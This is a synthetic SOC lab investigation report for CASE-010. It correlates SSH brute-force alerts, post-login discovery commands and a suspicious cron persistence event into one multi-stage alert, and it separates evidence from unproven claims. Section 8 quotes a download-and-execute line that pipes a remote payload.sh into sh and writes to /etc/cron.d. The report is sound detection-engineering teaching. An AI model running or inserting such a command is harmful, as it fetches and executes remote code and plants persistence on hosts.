# CASE-010 — Final Investigation Report

## 1. Executive Summary

CASE-010 is a synthetic SOC laboratory exercise demonstrating end-to-end correlation of multiple security detections into a single multi-stage investigation.

The scenario contains three correlated stages:

1. repeated SSH authentication failures followed by successful authentication;
2. post-authentication discovery and privilege-related activity; and
3. suspicious Linux cron persistence involving a download-and-execute command.

The three detection stages share the same laboratory host and user and occur within the configured 30-minute correlation window.

The correlation layer generated:

```text
ALERT-CASE-010-DET-CORR-001
```

with:

```text
Detection:  DET-CORR-001
Severity:   critical
Confidence: high
Stages:     3
Host:       lab-linux-10
User:       root
Source IP:  198.51.100.90
```

The observed correlated sequence spans approximately ten minutes from the successful authentication event to the suspicious persistence event.

The evidence supports investigation of a coherent multi-stage attack sequence.

It does **not** independently establish confirmed compromise, attacker identity, unauthorized access, successful payload execution, or successful persistence execution.

## 2. Case Information

| Field                  | Value                    |
| ---------------------- | ------------------------ |
| Case ID                | `CASE-010`               |
| Scenario               | Multi-Stage Attack       |
| Environment            | Synthetic SOC laboratory |
| Host                   | `lab-linux-10`           |
| User                   | `root`                   |
| Source IP              | `198.51.100.90`          |
| Correlation detection  | `DET-CORR-001`           |
| Correlation version    | `1.0`                    |
| Severity               | Critical                 |
| Confidence             | High                     |
| Correlation window     | 30 minutes               |
| Observed sequence      | Approximately 10 minutes |
| Supporting alerts      | 3                        |
| Supporting events      | 13                       |
| Total telemetry events | 14                       |

## 3. Investigation Question

The primary investigation question was:

> Does the available telemetry support a correlated sequence linking authentication attack activity, post-authentication activity, and Linux persistence on the same laboratory host and user?

The answer is:

**Yes.**

The available telemetry supports the correlation of the three detection stages.

However, correlation confidence must not be confused with proof of compromise.

## 4. Evidence Sources

The investigation used:

```text
telemetry/correlation/CASE-010-multi-stage-attack.jsonl
```

Detection outputs:

```text
cases/CASE-010/auth-001-alerts.json
cases/CASE-010/auth-003-alerts.json
cases/CASE-010/linux-001-alerts.json
```

Final correlation output:

```text
cases/CASE-010/alert.json
```

Supporting investigation records:

```text
README.md
investigation.md
timeline.md
indicators.md
threat-intelligence.md
hunting.md
response.md
lessons-learned.md
```

## 5. Evidence Classification

### Observed Evidence

The telemetry directly represents:

* six failed SSH authentication attempts;
* one successful SSH authentication;
* session establishment;
* four post-authentication commands;
* suspicious Linux persistence activity;
* a command referencing a download endpoint;
* a cron persistence path; and
* a benign cron administration event.

### Detection Evidence

The detection engine generated:

```text
DET-AUTH-001
DET-AUTH-003
DET-LINUX-001
```

The correlation layer then generated:

```text
DET-CORR-001
```

### Analyst Interpretation

The sequence is consistent with a multi-stage attack pattern because:

* authentication attack activity precedes successful authentication;
* privileged/discovery activity follows authentication;
* persistence activity follows the post-authentication stage;
* the stages share the same laboratory host and user;
* available source IP values are consistent; and
* the stages occur within the configured correlation window.

### Unproven Claims

The evidence does not independently establish:

* attacker identity;
* unauthorized access;
* malicious payload contents;
* successful payload download;
* successful payload execution;
* successful persistence execution;
* data access;
* data exfiltration; or
* confirmed host compromise.

## 6. Stage 1 — Authentication Attack

### Detection

```text
DET-AUTH-001
```

### Alert

```text
ALERT-CASE-001-DET-AUTH-001
```

### Observed Evidence

Six failed SSH authentication events occurred:

```text
EVT-010001
EVT-010002
EVT-010003
EVT-010004
EVT-010005
EVT-010006
```

They were followed by successful authentication:

```text
EVT-010007
```

The failed-attempt threshold is:

```text
5 failures within 5 minutes
```

The observed activity exceeded that threshold.

### Assessment

The sequence is consistent with brute-force authentication behavior.

The telemetry does not establish whether the successful authentication was unauthorized.

## 7. Stage 2 — Post-Authentication Activity

### Detection

```text
DET-AUTH-003
```

### Alert

```text
ALERT-CASE-004-DET-AUTH-003
```

### Observed Evidence

The session:

```text
SES-010-A
```

was established after successful authentication.

The following commands were observed:

```text
whoami
id
sudo -l
uname -a
```

These commands provide:

* account discovery;
* identity/group discovery;
* privilege-related enumeration; and
* system information discovery.

### Assessment

The activity is investigative-significant because it occurs after the authentication sequence and before the persistence stage.

The commands are not inherently malicious and may occur during legitimate administration.

## 8. Stage 3 — Linux Persistence

### Detection

```text
DET-LINUX-001
```

### Alert

```text
ALERT-CASE-009-DET-LINUX-001-EVT-010013
```

### Observed Event

```text
EVT-010013
```

The event contains:

```text
file_path:
/etc/cron.d/system-update
```

and the command:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

The detector identified three indicators:

```text
cron_persistence_path
shell_download_execution
hidden_or_tmp_payload
```

### Assessment

The combination of cron persistence, network resource retrieval, and shell execution creates a high-priority investigative condition.

The telemetry does not contain the actual payload.

Therefore, malicious payload content and successful persistence execution remain unconfirmed.

## 9. Benign Comparison Event

The telemetry also contains:

```text
EVT-010014
```

with:

```text
command_line:
crontab -e
```

This event represents benign administrative cron activity.

It was not included in the final three-stage correlation.

Its presence provides an important false-positive control.

The case demonstrates that cron activity alone should not automatically generate a multi-stage attack conclusion.

## 10. Correlation Analysis

The correlation layer required:

```text
DET-AUTH-001
+
DET-AUTH-003
+
DET-LINUX-001
```

The stages were correlated using:

* common host;
* common user;
* available source-IP consistency;
* chronological ordering; and
* a maximum 30-minute correlation window.

### Correlation Result

```text
ALERT-CASE-010-DET-CORR-001
```

Result:

```text
3 stages
3 supporting alerts
13 supporting events
```

### Stage Sequence

| Stage | Detection       | Activity                                      | Timestamp                   |
| ----- | --------------- | --------------------------------------------- | --------------------------- |
| 1     | `DET-AUTH-001`  | Credential attack / successful authentication | `2026-09-09T10:02:03Z`      |
| 2     | `DET-AUTH-003`  | Post-authentication activity                  | `2026-09-09T10:03:21+00:00` |
| 3     | `DET-LINUX-001` | Suspicious cron persistence                   | `2026-09-09T10:12:00Z`      |

The first and final correlated stage timestamps are approximately ten minutes apart.

## 11. Supporting Alert Chain

The final correlation alert references:

```text
ALERT-CASE-001-DET-AUTH-001
ALERT-CASE-004-DET-AUTH-003
ALERT-CASE-009-DET-LINUX-001-EVT-010013
```

These alerts represent independent detection outputs that were combined by the correlation layer.

The correlation layer does not replace the underlying detection evidence.

It provides an additional analytical relationship between the detections.

## 12. Supporting Event Chain

The correlated sequence contains:

```text
EVT-010001
EVT-010002
EVT-010003
EVT-010004
EVT-010005
EVT-010006
EVT-010007
EVT-010008
EVT-010009
EVT-010010
EVT-010011
EVT-010012
EVT-010013
```

The benign event:

```text
EVT-010014
```

was excluded from the correlated evidence.

## 13. Investigation Timeline

```text
10:00:01
First SSH authentication failure
        ↓
10:01:25
Sixth authentication failure
        ↓
10:02:03
Successful SSH authentication
        ↓
10:02:08
Session established
        ↓
10:02:24
whoami
        ↓
10:02:41
id
        ↓
10:03:02
sudo -l
        ↓
10:03:21
uname -a
        ↓
10:12:00
Suspicious cron persistence command
        ↓
10:14:00
Benign crontab administration
```

## 14. Investigation Pivots

Primary pivots are:

```text
198.51.100.90
        ↓
root
        ↓
lab-linux-10
        ↓
SES-010-A
        ↓
/etc/cron.d/system-update
        ↓
203.0.113.80/payload.sh
```

These pivots represent relationships observed in the synthetic telemetry.

They do not establish attacker identity.

## 15. Indicators

### Network

```text
198.51.100.90
203.0.113.80
```

### Host

```text
lab-linux-10
/etc/cron.d/system-update
```

### Identity

```text
root
```

### Session

```text
SES-010-A
```

### Resource

```text
/payload.sh
```

The network endpoint is a command-line reference.

The telemetry does not independently establish that a network connection to the endpoint succeeded.

## 16. Threat Intelligence Assessment

The IP addresses used in this case are documentation-network addresses.

No external reputation or attribution analysis was performed.

Consequently, the case does not claim:

* malicious IP reputation;
* infrastructure ownership;
* geographic attribution;
* threat-actor attribution;
* malware-family association; or
* external intelligence matches.

Additional intelligence enrichment would require authorized external sources and additional evidence.

## 17. ATT&CK Mapping

The correlated scenario references:

| Technique   | Relevance                                             |
| ----------- | ----------------------------------------------------- |
| `T1110`     | Repeated authentication failures                      |
| `T1078`     | Successful authentication represented in the sequence |
| `T1087`     | Account discovery                                     |
| `T1069.001` | Local permission/group discovery                      |
| `T1053.003` | Cron-based persistence                                |

These mappings describe behavioral context.

They do not independently establish malicious intent.

## 18. Severity Assessment

The final correlation alert is:

```text
Severity: critical
Confidence: high
```

The critical severity reflects the combination of multiple high-confidence stages involving authentication, privileged activity, and persistence.

The severity is a prioritization output from the laboratory correlation logic.

It is not equivalent to a confirmed compromise determination.

## 19. Impact Assessment

### Observed Impact

The available evidence establishes:

* authentication activity against a privileged account;
* successful authentication;
* post-authentication activity;
* suspicious persistence activity.

### Unknown Impact

The available evidence does not establish:

* data access;
* data modification;
* data destruction;
* lateral movement;
* credential theft;
* exfiltration;
* service disruption; or
* confirmed persistence execution.

Therefore, the business or operational impact remains **undetermined** within this laboratory scenario.

## 20. Root Cause Assessment

A definitive root cause cannot be established from the available telemetry.

The sequence may indicate an initial authentication attack followed by successful access and subsequent activity.

However, the evidence does not establish:

* how credentials were obtained;
* whether the successful authentication was unauthorized;
* whether the account was intentionally used for testing;
* whether the persistence command executed successfully; or
* whether the referenced payload was malicious.

Root cause therefore remains **unconfirmed**.

## 21. Response Assessment

The recommended response sequence is:

```text
Preserve evidence
       ↓
Validate scope
       ↓
Contain confirmed risk
       ↓
Investigate persistence
       ↓
Analyze available payload evidence
       ↓
Eradicate confirmed malicious artifacts
       ↓
Recover affected systems
       ↓
Validate detection controls
       ↓
Close investigation
```

No production containment, eradication, or recovery action was performed.

The response record documents recommended procedures for an authorized SOC environment.

## 22. Detection Engineering Assessment

CASE-010 demonstrates the value of correlating independent detections.

Without correlation, the evidence appears as separate alerts:

```text
Authentication attack
Post-authentication activity
Linux persistence
```

The correlation layer provides:

```text
Authentication attack
        +
Post-authentication activity
        +
Linux persistence
        ↓
Multi-stage investigation candidate
```

This improves investigative prioritization while preserving the distinction between evidence and analyst interpretation.

## 23. Detection Limitations

The current correlation capability has several limitations:

* it operates only on supplied detection alerts;
* missing telemetry can prevent correlation;
* timestamp quality affects sequence reconstruction;
* shared host/user values can occur in legitimate administration;
* source-IP data may be unavailable for some detections;
* correlation does not independently prove compromise;
* the correlation window is fixed at 30 minutes; and
* detection coverage outside the supplied stages is not represented.

## 24. Engineering Validation

CASE-010 includes a dedicated correlation module:

```text
src/case_correlation.py
```

with a corresponding contract:

```text
detections/correlation/DET-CORR-001-multi-stage-attack.yml
```

The correlation workflow was validated against the synthetic CASE-010 detection outputs.

The final correlation result contained:

```text
1 correlated alert
3 stages
3 supporting alerts
13 supporting events
```

The correlation implementation also handles stage alerts that expose their primary event time using compatible timestamp fields such as:

```text
timestamp
last_seen
first_seen
```

This was necessary because the existing detection outputs do not all expose an identical timestamp schema.

## 25. Evidence Chain

The complete CASE-010 evidence chain is:

```text
Synthetic telemetry
        ↓
Detection
        ↓
Individual alerts
        ↓
Alert normalization
        ↓
Cross-stage correlation
        ↓
Correlated alert
        ↓
Initial validation
        ↓
Timeline reconstruction
        ↓
Indicator extraction
        ↓
Threat-intelligence assessment
        ↓
Threat hunting
        ↓
ATT&CK mapping
        ↓
Response planning
        ↓
Final investigation assessment
        ↓
Detection improvement
        ↓
Regression validation
```

This represents the intended SOC investigation lifecycle demonstrated by the case.

## 26. Final Analyst Assessment

The available evidence supports the following conclusion:

> CASE-010 contains a coherent synthetic sequence linking repeated SSH authentication failures, successful authentication, post-authentication discovery and privilege-related activity, and suspicious Linux cron persistence on the same laboratory host and user within the configured correlation window.

The sequence is sufficiently significant to justify a high-priority investigation.

The evidence does not independently establish confirmed compromise, attacker attribution, unauthorized access, successful payload execution, or successful persistence execution.

## 27. Final Disposition

```text
Disposition:
Correlated multi-stage attack investigation candidate

Evidence confidence:
High for observed telemetry and detection correlation

Compromise status:
Undetermined

Attacker attribution:
Not established

Production impact:
Not assessed

Environment:
Synthetic SOC laboratory
```

## 28. Laboratory Limitations

This case is intentionally limited to a controlled synthetic environment.

It does not represent:

* a real customer incident;
* a production SOC investigation;
* real attacker infrastructure;
* real malware;
* real credentials;
* real victim data;
* real-world attribution; or
* verified production impact.

All indicators and events must be interpreted within the laboratory context.

## 29. Closure Requirements

Before formally closing CASE-010, the repository should contain:

* alert evidence;
* investigation record;
* timeline;
* indicators;
* threat-intelligence assessment;
* hunting record;
* response record;
* final report; and
* lessons learned.

The detection and correlation tests should also pass before the case is considered technically complete.

## 30. Final Conclusion

CASE-010 demonstrates an end-to-end SOC correlation and investigation workflow in a controlled laboratory environment.

The case connects multiple detection layers into a defensible evidence chain while maintaining explicit separation between:

```text
Observed evidence
        ↓
Detection result
        ↓
Correlation
        ↓
Analyst interpretation
        ↓
Unproven claims
```

This distinction is essential for professional SOC analysis.

The final case conclusion is therefore:

**The synthetic evidence supports investigation of a correlated multi-stage attack sequence, but does not independently prove compromise.**
